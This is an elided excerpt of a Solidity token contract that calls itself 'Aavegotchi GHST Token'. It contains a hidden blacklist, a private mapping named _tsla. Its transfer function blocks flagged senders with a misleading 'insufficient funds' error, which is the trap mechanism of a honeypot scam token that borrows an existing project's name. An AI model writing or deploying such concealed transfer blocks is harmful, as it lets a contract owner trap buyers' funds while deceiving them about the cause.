...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Aavegotchi GHST Token';

    string constant public symbol = 'GHST';
    ...
    mapping(address => bool) private _tsla;

   address public pair;

    uint256 public totalSupply = 51081467241*10**uint256(decimals);
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        require(!_tsla[from], "insufficient funds");
    ...
    function isTsla(address account) public view returns (bool) {
        ...
        return _tsla[account];
    }

}


contract GHST is BaseToken {
